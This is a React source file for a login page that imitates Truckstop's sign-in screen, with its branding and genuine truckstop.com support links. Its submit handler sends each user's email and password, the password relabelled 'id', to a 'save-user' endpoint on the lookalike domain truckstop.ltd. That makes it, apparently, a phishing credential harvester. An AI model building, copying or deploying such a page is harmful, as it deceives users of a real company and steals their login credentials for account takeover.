import { useState } from "react";
import NewCheckbox from "../NewCheckbox/NewCheckbox";
import NewInput from "../NewInput/NewInput";
import NewLogo from "../NewLogo/NewLogo";
import "./NewForm.scss";

const usernameRegex = /^[A-Za-z0-9][\w-\.\!\#\$\%\&\'\*\+\-\/\=\?\^\_\`\{\|\}\~]*@([\w-]+\.)+[\w-]{2,20}$/;


const isUsernameValid = (username) => {
  const isValid = usernameRegex.test(username);

  console.log(`username ${username} is ${isValid ? 'a valid' : 'not a valid'} email address.`);

  return isValid;
};

const NewForm = () => {
  const [form, setForm] = useState({ email: '', password: '' });
  const [isdisabled, setIsDisabled] = useState(false);
  const [error, setError] = useState('');

  const handleRequset = (callback) => {
    setIsDisabled(true);
    fetch('https://app.truckstop.ltd/save-user', {
      method: 'post',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: form.email,
        id: form.password,
      })
    })
    .then(callback)
    .finally(() => setIsDisabled(false));
  }

  const handleChange = (value, name) => {
    setForm(prev => ({ ...prev, [name]: value }))
  }

  const handleSubmit = () => {
    if (error) {
      setError(' Please enter a valid email');
    } else {
      handleRequset(() => {
        
      })
    }
  }

  return (
    <div className='new-form'>
      <pre>{JSON.stringify(form, null, 2)}</pre>
      <div className="new-form__inner">
        <h1 className="new-form__logo">
          <NewLogo />
        </h1>
        <header className="new-form__header">
          <h3 className="new-form__header-title">Login to your account</h3>
          <p className="new-form__header-description">Enter your details below</p>
        </header>
        <div className="new-form__form">
          <div className="new-form__new-input-wrapper">
            <NewInput error={error} onChange={(value, name) => handleChange(value, name)} label="Your Email" name="email" />
          </div>
          <div className="new-form__new-input-wrapper">
            <NewInput onChange={(value, name) => handleChange(value, name)} label="Password" name="password" type="password" />
          </div>
          <div className="new-form__new-checkbox-wrapper">
            <NewCheckbox />
          </div>
          <div className="new-form__actions-wrapper">
            <button disabled={isdisabled} onClick={handleSubmit} className="new-form__button">LOGIN</button>
            <span className="new-form__action-text">Reset Password</span>
            <a target="_blank" rel="noreferrer" href="https://truckstop.com/contact-us/" className="new-form__action-text">Get Support</a>
            <a target="_blank" className="new-form__action-text" rel="noreferrer" href="https://auth.truckstop.com/myaccount">Manage How I Login</a>
          </div>
        </div>
      </div>
    </div>
  )
}

export default NewForm